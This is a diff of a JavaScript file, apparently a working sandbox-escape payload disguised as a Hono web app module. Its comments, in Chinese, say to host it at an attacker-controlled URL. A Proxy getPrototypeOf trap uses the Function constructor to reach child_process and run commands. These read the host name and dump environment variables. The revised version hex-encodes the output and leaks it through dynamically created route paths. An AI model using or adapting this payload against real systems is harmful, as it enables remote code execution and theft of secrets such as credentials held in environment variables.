@@ -1,29 +1,27 @@
-// payload.js（放到你可控 URL，必须匿名 GET 可读）
 const { Hono } = require('hono');
 const app = new Hono();
 
-// --- RCE payload 开始 ---
+let rceResult = 'no-pwn';
 try {
-  // 构造一个把 getPrototypeOf 委托给主宿主的对象
   const trap = {
-    getPrototypeOf(target) {
-      // 这里的 `this` / 闭包 / Function constructor 可能运行在 "主宿主上下文"
-      // 用 Function constructor 拿到一个"无沙箱包装"的 function
-      const fn = (function () {}).constructor(
-        'return process.mainModule.require("child_process").execSync("id").toString()'
-      );
-      // 把结果写到一个能被读到的地方（console.log 会进 mongo 日志）
-      console.log('[PWN]', fn());
+    getPrototypeOf() {
+      try {
+        rceResult = (function(){}).constructor(
+          'return process.mainModule.require("child_process").execSync("id && cat /etc/hostname && env | head -20").toString()'
+        )();
+      } catch(e) { rceResult = 'ERR:' + String(e); }
       return null;
     }
   };
-  const badObj = {};
-  Object.setPrototypeOf(badObj, new Proxy({}, trap));
-  // 任何需要读 badObj 原型的操作都会触发 trap
-  throw badObj;
-} catch (e) {
-  // 吞掉异常，保证 module.exports 赋值继续执行
+  const x = Object.create(new Proxy({}, trap));
+  try { throw x; } catch(_) {}
+  try { Object.getPrototypeOf(x); } catch(_) {}
+} catch(e) { rceResult = 'OUTER:' + String(e); }
+
+const hex = Buffer.from(rceResult).toString('hex');
+const chunkSize = 50;
+for (let i = 0; i < hex.length && i < 2000; i += chunkSize) {
+  app.get(`/d${Math.floor(i/chunkSize)}_${hex.slice(i, i+chunkSize)}`, (c) => c.text(''));
 }
-// --- RCE payload 结束 ---
 
 module.exports = { default: app };
